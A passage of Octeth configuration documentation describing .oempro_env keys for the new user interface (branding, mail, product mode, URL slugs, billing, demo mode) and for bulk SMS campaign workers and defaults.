    Empty, the default, or a value that is not a plain http(s) URL (whitespace, brackets, angle
    brackets, quotes or backslashes) links Octeth's documentation at https://dev.octeth.com/. Set
    it to your own help page when you sell the service under your own brand. Restart the
    interface's container after changing it.

    **The interface is always on (issue #3494).** `UI_ENABLED` is removed: the reverse proxy
    routes `/user/`, `/ui/` and `/livewire-` to the interface on every install, and the container
    always serves it. Octeth no longer reads the key, and an upgrade deletes a leftover
    `UI_ENABLED` line from `.oempro_env`, whatever its value, with a one-line notice. The legacy
    areas stay reachable at `/app/user/` and `/app/admin/`. The two use **separate logins**: there
    is no single sign-on between them yet. The interface's calls to the admin API are exempt from
    the admin API IP allow-list by the address of its own container (issue #2913).

    **User and user group management live in the interface.** The legacy admin Users section
    (`/app/admin/users/`, issue #3450) and User Groups section (`/app/admin/usergroups/`, issue
    #3485) are removed. Their URLs redirect to the new interface's staff screens. The API is
    unaffected.

    The interface runs fully on every install (PHP 8.4, Apache, Laravel and its scheduler cron),
    so plan its memory, see [Server Requirements](./server-requirements). The only part that can
    be switched off is the AI assistant connector, with `MCP_ENABLED`.

    `UI_APP_KEY` must not be changed once set. Changing it invalidates every session, makes
    anything the interface has encrypted unreadable, and moves Livewire's endpoint paths, which
    are derived from it.

    `UI_MYSQL_DATABASE` is separate for safety, not tidiness. 212 of the interface's test files
    use Laravel's `RefreshDatabase`, which runs `migrate:fresh`, which **drops every table in
    whatever database is configured**. Pointed at Octeth's own database by a misconfiguration,
    that destroys the install. The container refuses to start if the two names match. Creating the
    database needs privileges the app user does not have, so it is done by the installer, by the
    upgrade script, or by hand with `./cli/octeth.sh ui:db-setup`.

    **Path mounting**

    ```bash
    UI_CUSTOMER_PREFIX=user              # Customer area
    UI_STAFF_PREFIX=user                 # Staff area (same prefix on purpose, see below)
    UI_SHARED_PREFIX=ui                  # Built assets, health endpoint, webhooks, brand assets
    ```

    These are the prefixes the reverse proxy forwards to the container. Changing one means
    changing the matching `acl` line in `_dockerfiles/haproxy.cfg` as well, so leave them alone
    unless a path genuinely collides with something else on your install.

    The staff prefix equals the customer prefix because the interface has a single login form
    serving both, so its staff screens live under `/user/staff/...`. That leaves `/admin/` free to
    go on redirecting to the legacy admin area.

    **Whitelabel: names and links**

    An administrator with full access (not a sub-admin) can override the name, legal name, tagline, trust stats, logos, favicon, colours, support and legal links and mail footer below from the staff area, **Settings > Branding** (see [Branding the New User Interface from the Staff Area](/v6.0.4/new-user-interface/staff-branding)). A value saved there wins over `.oempro_env` until it is reset on that screen, so editing one of these keys has no visible effect on a field the staff area overrides. The section switches (`BRAND_FEATURE_*` except `BRAND_FEATURE_BILLING`) can be overridden there too, under **Features**. The `UI_BRAND_SLUG_*` settings, `BRAND_FEATURE_BILLING`, `UI_MAIL_FROM_ADDRESS` and `UI_MODE` are `.oempro_env` only.

    ```bash
    UI_BRAND_NAME=Octeth
    UI_BRAND_LEGAL_NAME=
    UI_BRAND_SUPPORT_EMAIL=
    UI_BRAND_TERMS_URL=
    UI_BRAND_PRIVACY_URL=
    UI_BRAND_MAIL_FOOTER=
    ```

    Leaving a URL or an address empty is correct rather than incomplete: the interface hides the link instead of pointing it somewhere wrong. That includes "Contact support" on the password reset page, which is hidden while both `UI_BRAND_SUPPORT_URL` and `UI_BRAND_SUPPORT_EMAIL` are empty. `UI_BRAND_LEGAL_NAME` falls back to `UI_BRAND_NAME` when empty.

    Quote any value containing a space or a `#`, for example `UI_BRAND_NAME="Acme Mail"` and
    `UI_BRAND_TERMS_URL="https://acmemail.com/legal#terms"`. An unquoted space stops Octeth reading
    `.oempro_env` at all, so every setting falls back to its built-in default, and an unquoted `#`
    truncates the value at that point. The palette values in the next block need quotes for the same
    reason: every one of them starts with a `#`. Use one pair of quotes, not two. If you nested
    quotes on an earlier version to work around a brand value that stopped the interface starting,
    undo that: from v6.0.0 the inner double quotes are kept as part of the text (issue #2904).

    **Whitelabel: signed-out page copy**

    ```bash
    UI_BRAND_STATUS_URL=
    UI_BRAND_AUP_URL=
    UI_BRAND_SUPPORT_URL=
    UI_BRAND_TAGLINE=
    UI_BRAND_TRUST_STATS=
    ```

    Optional copy for the signed-out pages: sign in, sign up, password reset, two-factor and the error pages. Each item is hidden while its value is empty, which is the default, so a stock install shows no tagline, no figures and no status link. The brand panel that carries the tagline and the figures is shown only on screens at least 900px wide.

    - `UI_BRAND_STATUS_URL`: your status page, linked as "Status" in the footer of every signed-out page, next to Privacy and Terms.
    - `UI_BRAND_AUP_URL`: your Acceptable Use Policy. When set, the sign-up consent sentence reads "I agree to &lt;brand&gt;'s Terms of Service, Privacy Policy and Acceptable Use Policy, and to receive account-related emails." with the policy linked in a new tab, the consent error names all three policies, and the footer of every signed-out page links it as "Acceptable Use". When empty, the sentence, the error and the footer are unchanged. Acceptance is checked at sign-up but not recorded.
    - `UI_BRAND_SUPPORT_URL`: your help desk or contact page, linked as "Contact support" on the password reset page, opened in a new tab. It wins over `UI_BRAND_SUPPORT_EMAIL`, which is used as a `mailto:` link when this is empty. With neither set, the link is hidden.
    - `UI_BRAND_TAGLINE`: one short line at the top of the brand panel, for example `UI_BRAND_TAGLINE="Email and SMS for growing teams"`.
    - `UI_BRAND_TRUST_STATS`: figures at the bottom of the sign-in brand panel, written as `value|label` pairs separated by semicolons, for example `UI_BRAND_TRUST_STATS="10M+|Emails sent per month;99.9%|Uptime"`. An entry missing its value or its label is skipped. Show only figures you can back.

    Quote each of these when the value contains a space or a `#`, as above.

    From v6.0.1 the signed-out pages no longer ship their own copy: the "Trusted by" figures, the fixed taglines, the sign-up benefit list, "Start a free trial" (now "Create an account"), the "14-day free trial" heading and the no-credit-card line are gone. The Privacy, Terms, Acceptable Use and Status footer links and the sign-up consent links appear only when their URL is set.

    **Whitelabel: logo and icon**

    ```bash
    UI_BRAND_LOGO_MARK=/ui/images/brand/brand-logo-mark-white.svg
    UI_BRAND_LOGO_HORIZONTAL=/ui/images/brand/brand-logo-horizontal-black.svg
    UI_BRAND_FAVICON=/ui/favicon.ico
    ```

    Four marks ship under `ui/public/ui/images/brand/`: a square mark and a horizontal wordmark,
    each in a white and a black ink version. The defaults pair the **white mark** with the **black
    wordmark**, because the sidebar is near-black and signed-out pages are white. Swap to the
    opposite ink if you re-theme those surfaces, or point these at your own files.

    **The leading `/ui/` is `UI_SHARED_PREFIX` and is part of the path.** The proxy forwards only
    a fixed set of prefixes to this container, so a file served from the bare web root is handed
    to the legacy application and answers 404. If you change `UI_SHARED_PREFIX`, move
    `ui/public/ui/` to match and update these three values, or the interface renders with broken
    images. The favicon follows the same rule for an additional reason: at the bare
    `/favicon.ico` the legacy application answers, so a whitelabelled install could not otherwise
    override the interface's tab icon.

    **Whitelabel: palette**

    ```bash
    UI_BRAND_PRIMARY="#0A0A0A"           # Sidebar background and body text
    UI_BRAND_PRIMARY_900="#000000"
    UI_BRAND_PRIMARY_700="#262626"
    UI_BRAND_PRIMARY_ON="#FFFFFF"        # Text and icons on a primary fill (sidebar, dark badges, banners)
    UI_BRAND_ACCENT="#0A0A0A"            # Buttons, links, active navigation, focus rings
    UI_BRAND_ACCENT_HOVER="#262626"
    UI_BRAND_ACCENT_LIGHT="#F4F4F5"
    UI_BRAND_ACCENT_600="#000000"
    UI_BRAND_ACCENT_700="#000000"
    UI_BRAND_ACCENT_100="#E4E4E7"
    UI_BRAND_ACCENT_050="#FAFAFA"
    UI_BRAND_ACCENT_ON="#FFFFFF"         # Text and icons on an accent fill (primary buttons, avatars, toasts)
    ```

    Two colours drive the interface: the primary, which is the sidebar background and the body
    text colour, and the accent, which is buttons, links, active navigation and focus rings. The
    remaining keys are shades derived from those two and only need setting if you want them to
    differ from the defaults. They are applied as CSS variables when a page renders, so a change
    takes effect on the next container start with no asset rebuild.

    Octeth ships monochrome: both colours are near-black. The sidebar renders its active navigation in the **primary foreground** (`UI_BRAND_PRIMARY_ON`, white by default) rather than in the accent, because a black accent cannot be seen against a black sidebar. If you set a coloured accent here, that sidebar rule keeps the primary foreground and will no longer match it.

    **Text on a coloured fill.** `UI_BRAND_PRIMARY_ON` and `UI_BRAND_ACCENT_ON` set the colour of the text and icons drawn on top of a solid primary or accent fill. The primary foreground covers the sidebar, the sign-in brand panel, dark badges and the dashboard banner. The accent foreground covers primary buttons, avatars, toasts, step indicators and the header of the interface's own emails (welcome, password reset, billing notices). Both default to white, so an install that sets neither looks exactly as before.

    If you choose a light or mid primary or accent, set the matching `_ON` key to a dark colour so the text stays readable. WCAG 2.1 AA asks for a contrast ratio of at least 4.5:1 for normal text. For example, white on an amber accent `#F2A73B` is about 2.0:1, while `UI_BRAND_ACCENT_ON="#0A0A0A"` on the same amber is about 9.0:1:

    ```bash
    UI_BRAND_ACCENT="#F2A73B"
    UI_BRAND_ACCENT_ON="#0A0A0A"
    ```

    Like the other palette keys, both must be quoted and must be a 3, 6 or 8 digit hex. An invalid value is ignored and white applies. The email header is the one place that also uses the accent as a background: from v6.0.1 it follows `UI_BRAND_ACCENT` instead of a fixed dark blue, with `UI_BRAND_ACCENT_ON` as its text colour.

    ::: warning Quote the hex values
    A bare leading `#` is read as the start of a comment by the `.oempro_env` parser, so
    `UI_BRAND_PRIMARY=#0A0A0A` resolves to an **empty** value on the PHP side while the
    container's own reader sees the hex, leaving the two silently disagreeing. Written as
    `UI_BRAND_PRIMARY="#0A0A0A"`, both read it correctly.

    Each value must be a 3, 6 or 8 digit hex including the `#`. Anything else is dropped when the
    page renders and the stylesheet default applies instead, so a typo shows up as an unchanged
    colour rather than a broken page.
    :::

    **Outbound mail from the interface**

    ```bash
    UI_MAIL_MAILER=log                   # 'log' writes messages to the interface's log instead of sending
    UI_MAIL_HOST=
    UI_MAIL_PORT=587
    UI_MAIL_FROM_ADDRESS=
    UI_MAIL_USERNAME=                    # SMTP AUTH user, empty = no authentication
    UI_MAIL_PASSWORD=                    # Quote it if it contains a space, a '#' or a quote
    UI_MAIL_SCHEME=                      # smtp | smtps, empty = chosen by port
    UI_MAIL_AUTO_TLS=true                # STARTTLS when the relay offers it
    ```

    Used for the interface's own transactional mail (signup verification, password reset, billing notices), **not** for campaign delivery, which goes through Octeth's send engine as always. Set `UI_MAIL_MAILER=smtp` and fill in the host to send for real.

    - `UI_MAIL_USERNAME` and `UI_MAIL_PASSWORD` are the SMTP credentials. Every hosted relay needs them: Amazon SES, Postmark, SendGrid, Mailgun, Microsoft 365 and Gmail all require SMTP authentication. Leave both empty for a relay that authorises this server by IP address, and no authentication is attempted. Quote the password if it contains a space, a `#` or a quote, for example `UI_MAIL_PASSWORD="p#ss word"`, with one pair of quotes. It is written into `ui/.env` (owner `root:www-data`, mode `0640`), the file that already holds the MySQL password.
    - `UI_MAIL_SCHEME` is `smtp` (a plain connection, upgraded with STARTTLS when the relay offers it) or `smtps` (implicit TLS). Empty chooses by port: implicit TLS on 465, STARTTLS otherwise, so the two standard ports work without setting it. Port 465 uses implicit TLS even with `smtp`, so the only reason to set this is `smtps` for a relay that expects implicit TLS on another port. Any other value is ignored with a warning in the interface container's log.
    - `UI_MAIL_AUTO_TLS` upgrades a plain connection with STARTTLS. Leave it `true`. Set it to `false` only for a relay whose TLS is broken, because the password then crosses the network unencrypted. Any value other than `true` or `false` (also accepted: `1`/`0`, `yes`/`no`, `on`/`off`) is treated as `true`, with a warning.

    `UI_MAIL_USERNAME`, `UI_MAIL_PASSWORD` and `UI_MAIL_SCHEME` are written to the interface's configuration only when set, so an install that leaves them empty runs exactly as before.

    ::: warning Signup is offered only while the mailer delivers
    A self-signup account is created disabled and is enabled only by the verification link in its welcome email. Under `UI_MAIL_MAILER=log` that email is written to the interface's log and never delivered, so from v6.0.1 the interface offers signup only while the mailer is one that sends for real: `smtp`, `sendmail`, `ses`, `postmark` or `resend`. Of those, `smtp` is the one the `UI_MAIL_*` settings above configure. Under `log`, the default, or any other value such as `array` or `failover`, the "Create an account" link is hidden and `/user/register` shows a "Signup is not available" message and creates no account. Octeth's own switch in **Admin > Settings > ESP settings** must be on as well. Password reset emails are likewise only written to the log under `log`.
    :::

    A mail server that rejects a message no longer produces an error page. At signup the account is created and the visitor is told the verification email could not be sent and to contact support. At password reset the visitor sees the usual "sent" screen, so the page does not reveal which addresses have accounts. Both failures are logged at `error` level in the interface's log.

    Changed in v6.0.1 (issue #2852): `UI_MAIL_USERNAME`, `UI_MAIL_PASSWORD`, `UI_MAIL_SCHEME` and `UI_MAIL_AUTO_TLS` were added, and signup is offered only while the mailer delivers.

    **Product mode**

    ```bash
    UI_MODE=full                         # 'full' or 'gateway'
    ```

    `full` is the complete marketing product and the default. `gateway` turns the interface into
    an email relay service: campaigns, journeys, SMS, lists, templates, header and footer, the
    dashboard, analytics and deliverability are hidden and their pages return 404, the API page
    hides its account webhooks tab, and the sidebar lists the transactional sections (API keys, SMTP,
    webhooks, statistics, recipient domains) for a sending domain picked in a switcher. Users land
    on the transactional overview after signing in. Any other value is treated as `full`. An
    individual section can be switched back on with its `BRAND_FEATURE_<NAME>=true` key (for example
    `BRAND_FEATURE_CAMPAIGNS=true`, which also needs `BRAND_FEATURE_LISTS=true`). Restart the
    interface container after changing it.

    **Section switches**

    ```bash
    # BRAND_FEATURE_DASHBOARD=true
    # BRAND_FEATURE_CAMPAIGNS=true
    # BRAND_FEATURE_JOURNEYS=true
    # BRAND_FEATURE_SMS=true
    # BRAND_FEATURE_LISTS=true
    # BRAND_FEATURE_TEMPLATES=true
    # BRAND_FEATURE_EMAIL_HEADER_FOOTER=true
    # BRAND_FEATURE_ANALYTICS=true
    # BRAND_FEATURE_DELIVERABILITY=true
    # BRAND_FEATURE_USER_WEBHOOKS=true
    # BRAND_FEATURE_TRANSACTIONAL=true
    # BRAND_FEATURE_SUPPRESSIONS=true
    # BRAND_FEATURE_SENDERS=true
    # BRAND_FEATURE_API=true
    ```

    Each key shows (`true`) or hides (`false`) one customer section, and a hidden section's pages return 404. Leave a key out to keep the default: the first ten are on in `full` mode and off in `gateway` mode, and the last four (transactional email, the email suppression list, sender domains and the API page) are on in both modes. Only a non-empty value is passed to the interface. `BRAND_FEATURE_CAMPAIGNS=true` and `BRAND_FEATURE_JOURNEYS=true` also need `BRAND_FEATURE_LISTS=true`. Hiding `BRAND_FEATURE_SENDERS` stops customers setting up their own sending domains, so set them up from the staff area instead. An administrator with full access can override each switch from **Settings > Branding > Features**, with no restart, and a value saved there wins until it is reset. The table of sections is in [Product mode and sections](/v6.0.4/new-user-interface/configuration-reference#product-mode-and-sections).

    `BRAND_FEATURE_TRANSACTIONAL`, `BRAND_FEATURE_SUPPRESSIONS`, `BRAND_FEATURE_SENDERS` and `BRAND_FEATURE_API` introduced in v6.0.2 (issue #3300). Before that, those sections were always shown.

    **URL slugs**

    ```bash
    UI_BRAND_SLUG_DASHBOARD=
    UI_BRAND_SLUG_CAMPAIGNS=
    UI_BRAND_SLUG_JOURNEYS=
    UI_BRAND_SLUG_TRANSACTIONAL=
    UI_BRAND_SLUG_LISTS=
    UI_BRAND_SLUG_TEMPLATES=
    UI_BRAND_SLUG_SENDERS=
    UI_BRAND_SLUG_API=
    ```

    Rename the first path segment of a customer section. For example `UI_BRAND_SLUG_CAMPAIGNS=broadcasts` serves the campaigns pages at `/user/broadcasts`. Empty keeps the default, which is the section's own name. Only the visible path changes: the `/user/` prefix and the proxy rules are unaffected, so nothing else needs reconfiguring.

    A slug must be one lowercase URL segment made of `a`-`z`, `0`-`9` and `-`. Anything else is ignored with a warning in the interface container's log, and the default applies. A slug equal to a path segment another page already uses is rejected the same way, because the two pages would hide each other. The reserved segments are `2fa`, `2fa-recover`, `account`, `accounts`, `billing`, `coming-soon`, `email-header-footer`, `forgot-password`, `health`, `login`, `logout`, `maintenance`, `register`, `reset-password`, `staff`, `stripo`, `suppressions`, `verify-email` and `webhooks`. Each slug must also be unique. The container runs `php artisan brand:check` on every start and logs a warning for a duplicate slug, a slug taken by another page, or a section switched on while one it depends on is off. Restart the interface container after changing a slug, and update any bookmark or link that used the old path.

    Introduced in v6.0.1 (issue #2852).

    **Subscription billing and the drag-and-drop builder**

    ```bash
    BRAND_FEATURE_BILLING=false          # The interface's own plans, invoicing, dunning, tax and gateways
    UI_STRIPE_SECRET_KEY=
    UI_STRIPE_PUBLISHABLE_KEY=
    UI_STRIPE_WEBHOOK_SECRET=
    ```

    Billing is separate from Octeth's existing payments and is off by default. With it off, every
    account is treated as outside billing and no paywall applies, so the interface is fully usable.
    Be aware it is also the interface's only per-feature gate, so with billing off there is no
    per-feature gating at all. That is usually correct for a licensed on-premise install, but it
    should be a decision rather than a surprise. The Stripe keys are read only when billing is on;
    inbound webhooks are received at `<APP_URL>/ui/webhooks/<gateway>`.

    ```bash
    UI_BILLING_TAX_CALCULATOR=           # Empty = the built-in zero-tax stub
    ```

    ::: danger No tax calculation ships with Octeth
    Every invoice is calculated with **zero tax**. Octeth includes no tax calculator other than a stub that charges zero tax on every line, and the **Billing health** screen reports it. `UI_BILLING_TAX_CALCULATOR` is only an extension point: it names a PHP class implementing `App\Billing\Tax\TaxCalculator` that the interface can load. Octeth ships no such class, and a file you add under `ui/` is replaced on every upgrade. If you must charge VAT, sales tax or GST, do not use this billing system to invoice those customers. Setting this key does not make tax work.
    :::

    `UI_BILLING_TAX_CALCULATOR` is read only when `BRAND_FEATURE_BILLING=true`, and is written to the interface's configuration only when set. Introduced in v6.0.1 (issue #2852).

    The new interface's drag-and-drop email builder uses the Stripo Plugin ID and Secret Key saved
    in the staff **Settings > Integrations** screen, the same settings the legacy interface uses (see
    [Stripo.email](#stripo-email)). It has no configuration key of its own. A change to those
    settings reaches the new interface within a minute, with no restart. The builder loads its
    JavaScript from `plugins.stripo.email` and stores assets on Stripo's CDN, so an install with no
    outbound internet access cannot use it. Leaving the Stripo settings empty disables the option
    and leaves Custom HTML and Plain text, which is the correct setting for those installs.

    Changed in v6.0.1 (issue #3095): `UI_STRIPO_PLUGIN_ID` and `UI_STRIPO_SECRET_KEY` were removed.

    Introduced in v5.9.6 (issue #2837).

    **Demo backend (development only)**

    ```bash
    UI_DEMO_MODE=false
    UI_DEMO_EMAIL=demo@meridiancoffee.test
    UI_DEMO_PASSWORD=demo
    UI_DEMO_STAFF_EMAIL=admin@octeth-demo.test
    ```

    Replaces the interface's Octeth client with an in-process one that answers from a fictional
    dataset: a coffee roaster with lists, campaigns, journeys and full engagement statistics. It
    exists so product screenshots show realistic figures, because delivery and engagement counters
    are written by the send pipeline and a fresh account therefore renders every chart empty.

    It is read only. Every screen renders, and nothing can be saved. The dataset uses the reserved
    `.test` domain, so no address or link in a screenshot can resolve to a real site.

    Ignored unless `APP_ENV` is `local` or `testing`, so setting it true on a production install
    does nothing at all. On a local install it does take effect, and the interface then shows
    fictional numbers to whoever uses it next with no visible sign that anything is different.
    Turn it off when you are finished. `php artisan about` reports the current state.

    `UI_DEMO_EMAIL` and `UI_DEMO_PASSWORD` sign in as the fictional customer.
    `UI_DEMO_STAFF_EMAIL` with the same password signs in as an administrator, which opens the
    staff area, the customer list and **Switch user** on the same dataset. Every customer in that
    list opens the same fictional account. Product demo videos use this login. Set it empty to turn
    the staff login off, and leave it out to use the default. Introduced in v6.0.2.

    Changing this value takes effect on the next start of the `oempro_ui` container, so a
    `docker compose restart oempro_ui` is enough: that container's entrypoint reads `.oempro_env`
    directly and rewrites the interface's own configuration from it every time it starts.

    Introduced in v5.9.6 (issue #2850).

50. **Bulk SMS Campaigns**

    The bulk SMS campaign feature (issue #2742). The keys below fall into two groups that behave differently. **Deployment settings** are read out of `.oempro_env` into constants when a process boots, so a change takes effect only after the SMS workers are restarted. **Business setting defaults** are fallbacks: once an administrator saves the matching value on the SMS campaign settings page, the stored value wins and editing the key here changes nothing.

    Every numeric value is clamped in code rather than validated where it is used, so one mistyped value in an env file cannot reach a worker loop. A value outside the stated range is silently replaced by the nearest allowed one, so check the range before assuming a change took effect.

    **Phone-only contact lists**

    ```bash
    SMS_BULK_LOAD_CHUNK_SIZE=1000                        # Rows per batch for the bulk contact loader. Clamped 1 to 10000
    SMS_ONLY_LIST_COUNT_CACHE_SECONDS=3600               # How long an SMS-only list's subscriber count is cached. Minimum 300
    SMS_ONLY_LIST_COUNT_INVALIDATION_WINDOW_SECONDS=60   # Coalescing window for count invalidations. 0 disables coalescing
    ```

    `SMS_BULK_LOAD_CHUNK_SIZE` sizes the batches used by `cli/sms_contacts_bulk_load.php`, the operator tool for the initial load of a large phone-only contact file. Each batch costs exactly two statements, one existence `SELECT` and one multi-row `INSERT`, so this trades transaction size against round trips. Too low and the loader approaches one round trip per row, which makes a multi-million-row load take hours longer than it needs to. Too high and the single `INSERT` can exceed MySQL's `max_allowed_packet` on a list with several mapped attribute fields, which fails the batch rather than slowing it down. Ongoing additions go through the API and are unaffected.

    `SMS_ONLY_LIST_COUNT_CACHE_SECONDS` is how long the active subscriber count of an SMS-only list is held in cache. An ordinary list holds it for 300 seconds. On a 60 million row SMS-only list a cache miss is a `COUNT(*)` over the whole table, and the figure is shown for information rather than used as a gate, so it is held far longer here. The clamp floor is the ordinary 300 seconds, because a shorter value would make an SMS-only list more expensive to display than a normal one.

    `SMS_ONLY_LIST_COUNT_INVALIDATION_WINDOW_SECONDS` collapses repeated invalidations of that count. Each invalidation is a full Redis keyspace scan, and the STOP replies arriving after a campaign to a million recipients number in the thousands, so they are reduced to at most one scan per list per window. Set it to `0` to invalidate on every change, which is only worth doing if you need the count to be exact within seconds and accept the scan load.

    **Deployment settings**

    ```bash
    SMS_CAMPAIGN_ENABLED=true                     # Master switch for the whole bulk SMS feature (default: true)
    SMS_CAMPAIGN_ENQUEUE_PAGE_SIZE=500            # Recipients read per page while enqueueing. Clamped 50 to 5000
    SMS_CAMPAIGN_CLAIM_TIMEOUT_SECONDS=600        # How long one worker's claim on a campaign survives. Minimum 60
    SMS_CAMPAIGN_STUCK_MINUTES=15                 # Age at which a released message is treated as stuck. Minimum 5
    SMS_CAMPAIGN_RELEASE_BACKLOG_SECONDS=60       # Seconds of measured throughput kept queued in RabbitMQ. Minimum 5
    SMS_SEND_MAX_BATCH=1000                       # Messages a sender accumulates before dispatch. Clamped 1 to 10000
    SMS_CAMPAIGN_ESTIMATE_TOKEN_TTL=900           # Seconds a confirmed cost estimate stays valid. Minimum 60
    SMS_CAMPAIGN_QUEUE_PARTITION_AHEAD_MONTHS=3   # Months of queue partitions kept ahead of today. Minimum 1
    SMS_LINK_SIGNING_KEY=                         # HMAC key for tracked short codes. Leave EMPTY, one is generated per install
    SMS_EVENTS_BATCH_SIZE=1000                    # Events flushed to ClickHouse per batch. Clamped 1 to 50000
    SMS_EVENTS_FLUSH_SECONDS=2                    # Seconds before a partial event batch is flushed anyway. Minimum 1
    SMS_EVENTS_MAX_RETRIES=5                      # Retries before an event batch is dead-lettered. Minimum 1
    SMS_DLR_MATCH_MAX_ATTEMPTS=20                 # Attempts to match a delivery report to its message. Minimum 1
    SMS_DLR_RETRY_TTL_SECONDS=30                  # Seconds an unmatched delivery report waits between attempts. Minimum 1
    SMS_DLR_BATCH_SIZE=200                        # Delivery report callbacks settled per batch. Clamped 1 to 5000
    SMS_ROLLUP_MAX_KEYS_PER_RUN=50000             # Dirty rollup keys processed per run. Minimum 1
    ```

    `SMS_CAMPAIGN_ENABLED` is the master switch for bulk SMS. With it set to `false` the release worker stops releasing and the API refuses bulk SMS operations with a message naming this key, so an install that does not use the feature carries none of its load.

    `SMS_CAMPAIGN_ENQUEUE_PAGE_SIZE` is how many recipients the enqueue worker reads from the list in one page while building a campaign's queue. A small page makes the enqueue of a large audience take many more queries than it needs to and leaves the campaign sitting in its queueing state for longer. A large page holds more rows in worker memory per iteration and lengthens the individual query, which on a very large list can push the read past a query timeout. The default suits audiences up to a few million.

    `SMS_CAMPAIGN_CLAIM_TIMEOUT_SECONDS` is how long one worker's claim on a campaign survives before another worker may take it over. It exists so a worker that dies mid-campaign does not leave that campaign frozen. Set it too low and two workers can both believe they own a campaign while the first is merely busy, which doubles the work and the log noise. Set it too high and a genuinely dead worker leaves its campaign untouched for that long, which is also how long a pause and resume can appear to hang.

    `SMS_CAMPAIGN_RELEASE_BACKLOG_SECONDS` is the backlog allowance, expressed in seconds of measured throughput. The release worker measures how fast the senders are actually sending and keeps the RabbitMQ queue no deeper than this many seconds of that rate. A short window starves the senders, which idle between ticks and leave gateway capacity unused. A long window pushes work into the broker faster than it can leave, which makes pausing, cancelling or re-rating a campaign slow to take effect because messages already released are already committed.

    `SMS_CAMPAIGN_STUCK_MINUTES` is how old a released message that never started sending must be before the sweep reclaims it and returns it to the queue. Set it too high and a message lost to a crashed sender sits undelivered for that long. Set it too low and the sweep reclaims messages that are simply waiting their turn in the broker, releases them again, and repeats forever while nothing is actually wrong.

    ::: warning Keep the stuck threshold well above the backlog window
    `SMS_CAMPAIGN_STUCK_MINUTES` and `SMS_CAMPAIGN_RELEASE_BACKLOG_SECONDS` are not independent. The release worker deliberately keeps up to `SMS_CAMPAIGN_RELEASE_BACKLOG_SECONDS` of work sitting in RabbitMQ, so every message in that backlog is waiting normally, not stuck. A stuck threshold shorter than the backlog window turns that normal backlog into a reclaim loop.

    The code enforces a floor of five times the backlog window for exactly this reason: the effective threshold is the larger of `SMS_CAMPAIGN_STUCK_MINUTES` in seconds and `SMS_CAMPAIGN_RELEASE_BACKLOG_SECONDS` multiplied by five. Raising the backlog window therefore raises the effective stuck threshold whether or not you also raise the stuck setting, so if you increase one, review the other.
    :::

    `SMS_SEND_MAX_BATCH` is the most messages one sender process accumulates before it hands them to its gateway. It is a ceiling on batching rather than the batch size itself, because the batch is then split per gateway at that gateway's own maximum per request. Set it below what a connector advertises and you cap that connector below what the provider allows, sending more requests than necessary. Set it very high and the sender holds that many messages unacknowledged from the broker at once, since this value is also its RabbitMQ prefetch, so a sender that dies redelivers a correspondingly larger block.

    `SMS_CAMPAIGN_ESTIMATE_TOKEN_TTL` is how long a confirmed cost estimate stays valid. After it expires the cost must be re-confirmed before the campaign can be sent. Shorten it if your audience changes quickly and you want the figure an operator approves to be close to what is actually charged. Lengthen it if operators routinely prepare a campaign well before sending it and find themselves re-confirming.

    `SMS_CAMPAIGN_QUEUE_PARTITION_AHEAD_MONTHS` is how many months of campaign queue partitions the maintenance command keeps ahead of today. The minimum is 1. Keeping more costs nothing but empty partitions, and keeping too few risks a send arriving with no partition to write to if the maintenance command has not run recently.

    `SMS_EVENTS_BATCH_SIZE` and `SMS_EVENTS_FLUSH_SECONDS` govern how SMS events reach ClickHouse. The worker flushes when it has this many events, or when a partial batch has waited this many seconds, whichever comes first. Larger batches and a longer linger mean fewer, more efficient ClickHouse inserts and a longer delay before events appear in reporting. Smaller values do the reverse.

    `SMS_EVENTS_MAX_RETRIES` is how many times an event batch is retried before it is dead-lettered rather than dropped. Raising it makes the worker more patient with a ClickHouse outage at the cost of holding the batch longer.

    `SMS_DLR_MATCH_MAX_ATTEMPTS` is how many times an unmatched delivery report is retried before it is given up on. A fast gateway can report delivery before the sender has finished recording the gateway's message ID, so an unmatched report is retried rather than discarded. With the default spacing below this covers roughly ten minutes. Raise it only if your gateway is known to report against messages you have not yet recorded for longer than that.

    `SMS_DLR_RETRY_TTL_SECONDS` is how long an unmatched delivery report waits before the next attempt, so it sets the spacing of the attempts above and, with them, how long the system is prepared to wait for a report and its message to meet. It is applied as a time-to-live on the retry queue itself, which means **changing it on a running install requires deleting the `sms_delivery_reports_retry` queue once** so it can be recreated with the new value. RabbitMQ refuses to redeclare a queue whose arguments have changed, and the delivery report worker logs exactly this instruction when that happens.

    `SMS_DLR_BATCH_SIZE` is how many delivery report callbacks the processor holds before it settles them together. A gateway that reports in batches sends many messages in one callback, and the processor resolves a whole batch with one query per gateway instead of one per report. Raising it means fewer database round trips and more messages held unacknowledged from the broker, so a processor that dies redelivers a correspondingly larger block. Lowering it does the reverse.

    `SMS_ROLLUP_MAX_KEYS_PER_RUN` bounds how many dirty rollup keys one rollup run processes. It caps the length of a single run rather than the total work, so lowering it makes runs shorter and more frequent.

    ::: danger Do not change `SMS_LINK_SIGNING_KEY` once campaigns have been sent
    This is the HMAC key for tracked SMS short codes. Unlike every other key in this file, its example value is deliberately **empty**: installation generates one, and an upgrade generates one if it is still empty, so every deployment has its own. A shipped default would be shared by every Octeth install, and anyone could then forge a short code against all of them.

    Every short code already sitting in a recipient's phone is signed with the current key. Changing it breaks all of them. It also signs cost estimate tokens, so with no key available at all the system refuses to issue an estimate rather than issuing an unsigned one.
    :::

    **Defaults for settings an administrator can change**

    Each key below is a fallback used only until the matching value is saved on the SMS campaign settings page. After that the stored value wins and editing the key changes nothing, which the settings page shows per setting so an operator can tell which is in force. A stored value takes effect within about a minute without a restart. The clamps apply to both the stored value and this fallback.

    ```bash
    SMS_CAMPAIGN_MAX_RECIPIENTS=1000000                  # Largest audience one campaign may target. Clamped 1 to 100000000
    SMS_CAMPAIGN_COST_PER_PART=0.0100                    # Assumed cost per message part when estimating. Clamped 0 to 1000
    SMS_CAMPAIGN_COST_CURRENCY=USD                       # Currency label for the estimate
    SMS_CAMPAIGN_COST_DRIFT_TOLERANCE=0.05               # Allowed drift from the confirmed estimate. Clamped 0 to 1 (0.05 is five percent)
    SMS_CAMPAIGN_QUIET_HOURS_START=21:00                 # Default quiet hours start, in the campaign's own timezone
    SMS_CAMPAIGN_QUIET_HOURS_END=09:00                   # Default quiet hours end, in the campaign's own timezone
    SMS_CAMPAIGN_DEFAULT_SEND_RATE_PER_MINUTE=0          # Default send rate for new campaigns. 0 is unlimited
    SMS_CAMPAIGN_JOURNEY_RESERVE_PERCENT=10              # Capacity reserved for journey and transactional SMS. Clamped 0 to 50
